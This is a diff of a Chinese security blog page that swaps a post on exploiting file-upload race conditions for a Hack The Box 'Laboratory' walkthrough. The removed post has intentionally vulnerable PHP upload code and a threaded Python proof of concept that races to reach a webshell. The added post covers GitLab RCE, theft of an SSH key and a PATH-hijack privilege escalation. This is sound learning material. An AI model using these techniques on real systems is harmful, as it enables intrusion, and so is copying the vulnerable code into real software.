@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Conditional Competitive Learning | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Conditional Competitive Learning | 九世的博客">
+  <title>HTB laboratory | 九世的博客</title>
+  <meta name="keywords" content=" htb ">
+  <meta name="description" content="HTB laboratory | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1669,9 +1669,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Conditional-Competitive-Learning" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-HTB-laboratory" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Conditional Competitive Learning</h1>
+        <h1 class="article-title">HTB laboratory</h1>
     
     <div class="article-meta">
         
@@ -1680,14 +1680,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color4">htb</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-03-24 14:34</time>
+        创建时间:<time class="date" title="更新时间: 2021-03-18 13:37:14">2021-03-18 13:29</time>
         
     </div>
     <div class="article-meta">
@@ -1709,7 +1709,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#条件竞争"><span class="toc-text">条件竞争</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#入口点"><span class="toc-text">入口点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提升"><span class="toc-text">权限提升</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1724,72 +1724,26 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>准备上学，抽时间学了条件竞争并做了笔记<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181109/eefcba0df71b4ca18385a0152f51106a.jpeg" alt="eefcba0df71b4ca18385a0152f51106a.jpeg"></p>
-<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p><b>0x00介绍</b><br>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含webshell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差(因为要执行检查文件和删除文件的操作)，攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击</p>
-<p><b>0x01漏洞一般出现的位置</b><br>SRC好像都没见过，一般出现在CTF题吧<br>就是允许任意文件上传，但是会判断是否为webshell。更简洁的来说就是：</p>
-<pre><code>先将文件上传到指定目录然后在判断是否为webshell，是的话在删除。攻击者可以利用这段时间差来进行生成另一个shell。
-一般存在条件竞争的上传文件后，在短暂时间内发现可以访问。可是后面就被删了，这就有：条件竞争
-</code></pre><p><b>0x02实验</b><br>存在漏洞的代码</p>
-<pre><code class="php">&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;条件竞争&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;form action=&quot;demo.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
-    &lt;label for=&quot;file&quot;&gt;文件名&lt;/label&gt;
-    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; na=&quot;submit&quot; value=&quot;上传&quot;&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-
-&lt;?php
-header(&quot;Content-Type: text/html;charset=utf-8&quot;);
-if(isset($_FILES[&#39;file&#39;])) {
-    if ($_FILES[&#39;file&#39;][&#39;error&#39;] &gt; 0) {
-        echo &quot;文件上传错误&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;
-    } else {
-        echo &quot;上传的文件名:&quot; . $_FILES[&#39;file&#39;][&#39;name&#39;] . &quot;&lt;br&gt;&quot;;
-        echo &quot;文件类型:&quot; . $_FILES[&#39;file&#39;][&#39;type&#39;] . &quot;&lt;br&gt;&quot;;
-        echo &quot;文件大小:&quot; . $_FILES[&#39;file&#39;][&#39;size&#39;] . &quot;&lt;br&gt;&quot;;
-        echo &quot;文件临时存储位置&quot;.$_FILES[&#39;file&#39;][&#39;tmp_name&#39;].&quot;&lt;br&gt;&quot;;
-        move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;upload/&#39; . $_FILES[&#39;file&#39;][&#39;name&#39;]);
-        $demo=explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;]);
-        $hz=end($demo);
-        sleep(10);
-        if ($hz!=&#39;jpg&#39;){
-            unlink(&#39;upload/&#39;.$_FILES[&#39;file&#39;][&#39;name&#39;]);
-            echo &quot;发现webshell，已删除&quot;;
-        }
-    }
-}
-?&gt;
-</code></pre>
-<p>poc</p>
-<pre><code class="python">import requests
-import threading
-
-s = 0
-def demo(url):
-    global s
-    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;}
-    rqt=requests.get(url=url,headers=headers)
-    s+=1
-    print(&#39;[+] 已请求:{}次&#39;.format(s))
-    rqt=requests.get(url=&#39;http://127.0.0.1/jinz/upload/xxx.php&#39;,headers=headers)
-    if rqt.status_code==200:
-        print(&#39;[+] shell上传成功&#39;)
-
-if __name__ == &#39;__main__&#39;:
-    urls=&#39;http://127.0.0.1/jinz/upload/xx.php&#39;
-    for i in range(1,30):
-        t=threading.Thread(target=demo,args=(urls,))
-        t.start()
-</code></pre>
-<p>  <img src="https://s2.ax1x.com/2019/03/24/AYQxqH.md.png" alt=""></p>
-<p>  <img src="https://s2.ax1x.com/2019/03/24/AYlSZd.md.png" alt="AYlSZd.md.png"></p>
-<p>  <img src="https://s2.ax1x.com/2019/03/24/AYlpdA.md.png" alt="AYlpdA.md.png"></p>
-<p>  <b>0x003修复</b><br>  针对此漏洞修复是，要判断是否为允许后缀在上传的过程判断，不要上传完毕才判断<br>  对上传后的文件进行重命名</p>
-<p>  转载请声明：转自422926799.github.io</p>
+        <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规nmap扫描</p>
+<pre><code>nmap -sC -sV 10.10.10.216
+</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqiSe.png" alt=""></p>
+<p>从扫描结果能看到，有两个域</p>
+<pre><code>laboratory.htb
+git.laboratory.htb
+</code></pre><p>加入/etc/hosts<br><img src="https://s3.ax1x.com/2021/03/18/6gqFQH.png" alt=""></p>
+<p>访问<code>laboratory.htb</code>发现就一个静态，拉倒下面有三个用户名。先记录下来<br><img src="https://s3.ax1x.com/2021/03/18/6gqAOA.md.png" alt=""></p>
+<p>访问<code>git.laboratory.htb</code>是一个gitlab，注册gitlab发现版本<br>（ps:这里注册gitlab用他域做邮箱域：<a href="mailto:`joker@laboratory.htb" target="_blank" rel="noopener">`joker@laboratory.htb</a>`，不然会注册失败）<br><img src="https://s3.ax1x.com/2021/03/18/6gqeTP.png" alt=""></p>
+<p>![](<a href="https://s3.ax1x.com/2021/03/18/6gqnFf.png" target="_blank" rel="noopener">https://s3.ax1x.com/2021/03/18/6gqnFf.png</a></p>
+<h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>搜索gitlab对应的版本发现存在RCE,msf用对应的利用工具<br><img src="https://s3.ax1x.com/2021/03/18/6gqB6J.png" alt=""></p>
+<p>查看刚刚收集到的用户名，发现Dexter是CEO。修改他的密码<br><img src="https://s3.ax1x.com/2021/03/18/6gqDX9.png" alt=""></p>
+<p>登录它的gitlab发现有id_rsa<br><img src="https://s3.ax1x.com/2021/03/18/6gqsmR.png" alt=""></p>
+<p>ssh连接得到user.txt<br><img src="https://s3.ax1x.com/2021/03/18/6gq46H.png" alt=""></p>
+<p><img src="img/user.png" alt=""></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>suid查找发现存在个docker-security。strings查看，发现有执行命令chmod。利用劫持提权</p>
+<pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/chmod
+chmod 777 /tmp/chmod
+export PATH=/tmp:$PATH
+</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqqtf.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1799,12 +1753,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Conditional Competitive Learning</p>
+    <p><span class="copy-title">文章标题:</span>HTB laboratory</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-03-24, 14:34:11</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/2d4f21a3.html" title="Conditional Competitive Learning">http://422926799.github.io/posts/2d4f21a3.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-03-18, 13:29:21</p>
+    <p><span class="copy-title">最后更新:</span>2021-03-18, 13:37:14</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/2ee11a81.html" title="HTB laboratory">http://422926799.github.io/posts/2ee11a81.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
